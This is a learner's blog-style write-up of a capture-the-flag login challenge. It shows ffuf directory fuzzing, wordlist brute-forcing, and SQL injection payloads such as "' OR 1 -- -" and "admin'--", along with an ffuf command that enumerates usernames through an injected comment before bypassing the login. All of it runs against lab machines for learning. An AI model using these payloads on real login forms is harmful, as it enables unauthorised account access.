# Challenge 003 - Lesson Learned

Difficulty: Fairly Easy (3/10)
Completed: ✔️ (17.08.2025)

Since the prior challenge didn’t really take that much time out of my scedule I felt confident to immediately move on to the next task. I feel like this time things won’t be as easy. 

<img width="898" height="169" alt="image" src="https://github.com/user-attachments/assets/6ddf7a43-723c-4922-b8fb-bd7ebcc53791" />

This description already feels like I should prepare for some very weird shenanigans and easy pitfalls that I will most probably fall into. Let’s not manifest that. So for now I just tried to access the website.

The site we see is a simple Login page. Just out of instinct I tried the basic admin input, which led to no results, obviously.

<img width="1016" height="551" alt="image" src="https://github.com/user-attachments/assets/c9391517-c95f-4420-ac10-4fb8bca192e0" />

Time to look at the Page Source. After checking that out I was kind of confused about seeing this part of the source code.


```
<form action="/" method="POST">
<label for="username">Username</label>
<input id="username" type="text" name="username"/>
<label for="password">Password</label>
<input id="password" type="password" name="password"/>
<input type="submit" value="Login"/>
</form>
```

I’m still new to all of this, but I think this shouldn’t be in the open. But I can’t bother to control this yet. I’d rather use tools like ffuf to see if there may are any secret endpoints that we can brute-force. If that won’t work we can move on and try to use Burp Suite. All in it’s time.

For anyone wondering and wanting a good laugh (or maybe just cringe) at first I wrote the completely wrong command, which made even ChatGPT think I was vhost fuzzing, even though I really wanted to check out directories…
We DON’T put FUZZ in the Host header ☠️ . This is for virtual hosts, not directories. Look… yet again… I’m still an amateuer… I’m allowed to do this. Shut up.

Anyways if I want to find secret folders, FUZZ needs to go to the URL path, so the correct syntax would be something like:

```
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.245.25/FUZZ

root@ip-10-10-234-183:~# ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.245.25/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.245.25/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

:: Progress: [40/4614] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Error:: Progress: [659/4614] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Erro                        [Status: 200, Size: 1223, Words: 35, Lines: 32]
:: Progress: [1229/4614] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Err:: Progress: [1572/4614] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errindex.php               [Status: 200, Size: 1223, Words: 35, Lines: 32]
:: Progress: [2054/4614] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Err:: Progress: [2316/4614] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Err.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]
:: Progress: [2471/4614] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Err.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10]
:: Progress: [2479/4614] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Err:: Progress: [2803/4614] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errmanual                  [Status: 301, Size: 313, Words: 20, Lines: 10]
:: Progress: [2887/4614] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Err.hta                    [Status: 403, Size: 277, Words: 20, Lines: 10]
:: Progress: [3021/4614] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errserver-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
:: Progress: [3592/4614] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Err:: Progress: [3596/4614] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Err:: Progress: [4402/4614] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Err:: Progress: [4614/4614] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Err:: Progress: [4614/4614] :: Job [1/1] :: 317 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

So apparently there are other directories. Interesting. Unfortunately none of them are accessible except the manual, which isn’t particularly interesting.

<img width="979" height="888" alt="image" src="https://github.com/user-attachments/assets/28587a0f-2455-4c84-afca-6a6e52ec4de0" />

This page feels like it’s mocking me and telling me how to Pentest the right way. Using ffuf for dictionaries doesn’t seem to have had any effect.

I tried to use the Network tool and send some test inputs to check if that could maybe lead to anything. But yet again there was not much of interest to be found

After that I tried some basic brute force ffuf attacks with usernames and password txts that I borrowed (wget) from GitHub. For that I first created a dictionary for my wordlists.

mkdir wordlists

changed into the directory and started to download the text files

```
root@ip-10-10-234-183:~/wordlists# wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt -O usernames.txt

root@ip-10-10-234-183:~/wordlists# wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt -O passwords.txt
```

after that we started the brute-forcing:

```
ffuf -X POST -u http://10.10.245.25/ \
       -d „username=FUZZ&password=PASS“ \
       -w usernames.txt:FUZZ -w passwords.txt:PASS \
       -H „Content-Type: applications/x-www-form-urlencoded“ 
```

which took a lot of time and resulted in exactly 0 breaches. Great.
Even when using the flag -fs 1253 this didn’t lead to anything worthwhile either.	
Maybe for my understanding I made sure I knew what every flag in ffuf does

    1. -X POST
        ◦ Tells ffuf to use the HTTP POST method instead of the default GET
        ◦ Needed because login forms usually submit via POST
    2. -u http://10.10.245.25/
        ◦ The target URL I’m attacking
        ◦ This is where the POST requests are sent.
    3. -d „username=FUZZ&password=PASS“
        ◦ Sets the POST data to send
        ◦ FUZZ and PASS are placeholders that will be replaced by the words from the wordlists
    4. -w usernames.txt:FUZZ -w passwords.txt:PASS
        ◦ Specifies the wordlists
        ◦ usernames.txt replaces the FUZZ keyword
        ◦ passwords.txt replaces the PASS keyword
    5. „Content-Type: application/x-www-form-urlencoded“
        ◦ Adds a custom HTTP header
        ◦ Needed here because form data in POST requests is sent as application/x-www-form-urlencoded
        ◦ Without this, the server might reject my POST requests or treat them incorrectly

Since I feel very crazy I tried a bigger usernames.txt file from GitHub
My AttackBox was shutdown so now the Target IP Address changed. Just so there is no confusion.

I really thought I was smart with this, but I wasn’t. The sizes always seem to differ, no matter what user is being used as input. That’s when I researched what exactly can influence the response size. Basically things like HTML content, headers, cookies and dynamic content. I could map out the sizes and automate after that. 

I used a curl command to save a body.txt and header.txt in my home directory and get a clearer idea what sort of outputs i get for specific imputs. I COULD try to test different curls and save the body to see what differences I get for different header sizes, but something tells me, this isn’t quite what is expected from me.

I looked at a YouTube video (again I’m sorry) and saw that somebody was working with SQL injection. I did not quite reach the point where I worked with that, so I put this challenge on hold and planned on doing a tryhackme room for SQL injections first, before returning to this

------------------------------------------------------------------------------------------------------------------------

It was a tough task but I returned one day later after having done the SQLi room to hopefully suceed in completing the room. I tried a simple SQLi, which did not work surprisingly

<img width="920" height="759" alt="image" src="https://github.com/user-attachments/assets/7d874a93-bb8e-4776-a55a-f31c8476655c" />

In the video it worked, but only, because he used 
‘ OR 1 -- -
which I didn’t even know was a syntax one could use. I need to look this up to understand, why this seems to work, but my input didn’t. In any case. When using those inputs for the username and password we get the following window

<img width="961" height="807" alt="image" src="https://github.com/user-attachments/assets/95554a36-ecfa-4ac5-a61e-a314887181da" />

I really thought I could outsmart the login page by setting a limit of
‘ OR 1=1 – LIMIT 1 -
Suffice to say I was just walking against a wall and needed to change the strategy and realise that learning SQLi would not be the solution, at least not in the way I was taught.
SQLmap is being advertised as a tool we should maybe use to solve this task. At least that’s what this looks like to me. What also could help is if I try to use Burp Suite and check what kind of SQL injections could be safer. Maybe there is a site, where I can check that out. But for now I needed to terminate the machine and start everything anew.
After watching a video from NetworkChuck about SQL Injections I at least want to try one injection that would just comment out the rest of the query and check for the admin, which should just be one line and not the entire database. For the username I tried the command
admin’-- 
and the password 
password123
which would just be commented out. That didn’t lead to anything yet again. 	

After a day passed I waited for friends to come by, so we could walk through this together. We tried running Burp Suite but quickly realized that the Response Header and Body wouldn’t lead to any clues, but at least I got firsthand experience with using the application for the first time. We discussed a lot of use cases and what kind of sql commands could be safe to use. The idea of using LIMIT 1 was brought up but was quickly rejected by me, reminding them, that I already tried that. Unfortunately my friends were also not that experienced when it came to SQL injections and only knew of the most common commands, which obviously were the exact ones the challenge recommended us not to use.
As this was taking a lot of time one of my friends gave up, while the other one said he would need to look up other videos, which gave a clear crash course on SQL injections and maybe even bruteforcing. I waved them goodbye and took a break myself.

Suddenly though I came to a conclusion that I never tried to apply. I had my textfile for all the usernames and knew I could comment out passwords, by the syntax of „-- -“. So I combined those ideas with the ffuf tool and reached the light of the tunnel. 

```
root@ip-10-10-102-195:~/inputs# ffuf -X POST -u http://10.10.179.215/ -d "username=FUZZ' -- -&password=test" -w usernames.txt:FUZZ -H "Content-Type: application/x-www-form-urlencoded" -fs 1253

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.179.215/
 :: Wordlist         : FUZZ: usernames.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=FUZZ' -- -&password=test
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 1253
________________________________________________

:: Progress: [40/10164] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Erro:: Progress: [206/10164] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Err:: Progress: [419/10164] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Err:: Progress: [631/10164] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errarnold                  [Status: 200, Size: 2524, Words: 251, Lines: 38]
:: Progress: [739/10164] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Err:: Progress: [827/10164] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Err:: Progress: [1029/10164] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Er:: Progress: [1233/10164] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Er:: Progress: [1420/10164] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Er:: Progress: [1614/10164] :: Job [1/1] :: 1835 req/sec :: Duration: [0:00:01] :::: Progress: [1805/10164] :: Job [1/1] :: 1906 req/sec :: Duration: [0:00:01] :::: Progress: [2005/10164] :: Job [1/1] :: 2136 req/sec :: Duration: [0:00:01] :::: Progress: [2183/10164] :: Job [1/1] :: 1832 req/sec :: Duration: [0:00:01] :::: Progress: [2404/10164] :: Job [1/1] :: 1871 req/sec :: Duration: [0:00:01] :::: Progress: [2603/10164] :: Job [1/1] :: 1815 req/sec :: Duration: [0:00:01] :::: Progress: [2797/10164] :: Job [1/1] :: 1842 req/sec :: Duration: [0:00:01] :::: Progress: [2988/10164] :: Job [1/1] :: 1798 req/sec :: Duration: [0:00:01] :::: Progress: [3194/10164] :: Job [1/1] :: 1628 req/sec :: Duration: [0:00:02] :::: Progress: [3388/10164] :: Job [1/1] :: 1546 req/sec :: Duration: [0:00:02] :::: Progress: [3567/10164] :: Job [1/1] :: 1829 req/sec :: Duration: [0:00:02] :::: Progress: [3738/10164] :: Job [1/1] :: 1647 req/sec :: Duration: [0:00:02] :::: Progress: [3901/10164] :: Job [1/1] :: 1558 req/sec :: Duration: [0:00:02] :::: Progress: [4107/10164] :: Job [1/1] :: 1864 req/sec :: Duration: [0:00:02] :::: Progress: [4308/10164] :: Job [1/1] :: 1325 req/sec :: Duration: [0:00:02] :::: Progress: [4499/10164] :: Job [1/1] :: 1597 req/sec :: Duration: [0:00:02] :::: Progress: [4679/10164] :: Job [1/1] :: 1665 req/sec :: Duration: [0:00:03] :::: Progress: [4889/10164] :: Job [1/1] :: 2099 req/sec :: Duration: [0:00:03] :::: Progress: [5073/10164] :: Job [1/1] :: 1414 req/sec :: Duration: [0:00:03] ::karen                   [Status: 200, Size: 2524, Words: 251, Lines: 38]
:: Progress: [5130/10164] :: Job [1/1] :: 1152 req/sec :: Duration: [0:00:03] :::: Progress: [5243/10164] :: Job [1/1] :: 1583 req/sec :: Duration: [0:00:03] ::kelly                   [Status: 200, Size: 2524, Words: 251, Lines: 38]
:: Progress: [5316/10164] :: Job [1/1] :: 1493 req/sec :: Duration: [0:00:03] :::: Progress: [5428/10164] :: Job [1/1] :: 1411 req/sec :: Duration: [0:00:03] :::: Progress: [5613/10164] :: Job [1/1] :: 1621 req/sec :: Duration: [0:00:03] :::: Progress: [5796/10164] :: Job [1/1] :: 1454 req/sec :: Duration: [0:00:03] :::: Progress: [5981/10164] :: Job [1/1] :: 1522 req/sec :: Duration: [0:00:03] :::: Progress: [6168/10164] :: Job [1/1] :: 1466 req/sec :: Duration: [0:00:04] :::: Progress: [6349/10164] :: Job [1/1] :: 1556 req/sec :: Duration: [0:00:04] ::marcus                  [Status: 200, Size: 2524, Words: 251, Lines: 38]
:: Progress: [6365/10164] :: Job [1/1] :: 1556 req/sec :: Duration: [0:00:04] ::martin                  [Status: 200, Size: 2524, Words: 251, Lines: 38]
:: Progress: [6526/10164] :: Job [1/1] :: 1602 req/sec :: Duration: [0:00:04] :::: Progress: [6542/10164] :: Job [1/1] :: 1825 req/sec :: Duration: [0:00:04] :::: Progress: [6727/10164] :: Job [1/1] :: 1503 req/sec :: Duration: [0:00:04] :::: Progress: [6916/10164] :: Job [1/1] :: 1536 req/sec :: Duration: [0:00:04] ::naomi                   [Status: 200, Size: 2524, Words: 251, Lines: 38]
:: Progress: [7103/10164] :: Job [1/1] :: 1848 req/sec :: Duration: [0:00:04] :::: Progress: [7108/10164] :: Job [1/1] :: 1848 req/sec :: Duration: [0:00:04] :::: Progress: [7291/10164] :: Job [1/1] :: 1486 req/sec :: Duration: [0:00:04] :::: Progress: [7465/10164] :: Job [1/1] :: 1519 req/sec :: Duration: [0:00:04] ::patrick                 [Status: 200, Size: 2524, Words: 251, Lines: 38]
:: Progress: [7595/10164] :: Job [1/1] :: 1426 req/sec :: Duration: [0:00:05] :::: Progress: [7649/10164] :: Job [1/1] :: 1561 req/sec :: Duration: [0:00:05] :::: Progress: [7830/10164] :: Job [1/1] :: 1485 req/sec :: Duration: [0:00:05] :::: Progress: [8015/10164] :: Job [1/1] :: 1527 req/sec :: Duration: [0:00:05] :::: Progress: [8222/10164] :: Job [1/1] :: 1756 req/sec :: Duration: [0:00:05] :::: Progress: [8405/10164] :: Job [1/1] :: 1418 req/sec :: Duration: [0:00:05] :::: Progress: [8596/10164] :: Job [1/1] :: 1459 req/sec :: Duration: [0:00:05] :::: Progress: [8766/10164] :: Job [1/1] :: 1444 req/sec :: Duration: [0:00:05] ::sophia                  [Status: 200, Size: 2524, Words: 251, Lines: 38]
:: Progress: [8909/10164] :: Job [1/1] :: 1917 req/sec :: Duration: [0:00:05] :::: Progress: [8980/10164] :: Job [1/1] :: 1421 req/sec :: Duration: [0:00:05] ::stuart                  [Status: 200, Size: 2524, Words: 251, Lines: 38]
:: Progress: [9022/10164] :: Job [1/1] :: 1372 req/sec :: Duration: [0:00:06] :::: Progress: [9180/10164] :: Job [1/1] :: 913 req/sec :: Duration: [0:00:06] :: :: Progress: [9359/10164] :: Job [1/1] :: 1288 req/sec :: Duration: [0:00:06] :::: Progress: [9554/10164] :: Job [1/1] :: 1369 req/sec :: Duration: [0:00:06] ::veronica                [Status: 200, Size: 2524, Words: 251, Lines: 38]
:: Progress: [9674/10164] :: Job [1/1] :: 1656 req/sec :: Duration: [0:00:06] :::: Progress: [9706/10164] :: Job [1/1] :: 1376 req/sec :: Duration: [0:00:06] :::: Progress: [9912/10164] :: Job [1/1] :: 1350 req/sec :: Duration: [0:00:06] :::: Progress: [10120/10164] :: Job [1/1] :: 1598 req/sec :: Duration: [0:00:06] ::: Progress: [10164/10164] :: Job [1/1] :: 1837 req/sec :: Duration: [0:00:06] ::: Progress: [10164/10164] :: Job [1/1] :: 1837 req/sec :: Duration: [0:00:06] :: Errors: 0 ::
```

Bam. That was it. Suddenly the flag seemed so close. I inserted veronica in the username field and tried to comment out passwords by sql injection and voila:

<img width="906" height="653" alt="image" src="https://github.com/user-attachments/assets/63932436-57a6-4047-88af-31aedf6f3d40" />

The flag was MINE! It took so long, but this was one of the few times I shouted out loud after finally making it. Success never tasted so sweet.

The lesson I learned was… If you still didn’t realize: using SQL injections like ‘ OR 1=1 are very dangerous and should be the very last thing someone tries to do. We should always try to keep in mind how a developer thinks and that he probably only considers one query to be executed in a login page. This definetely will not leave my head any time soon now. After having solved this I can wholeheartedly recommend this challenge. It’s really insightful and while it was torture at times, it made the success and learning curve all the sweeter. Cheers to that!
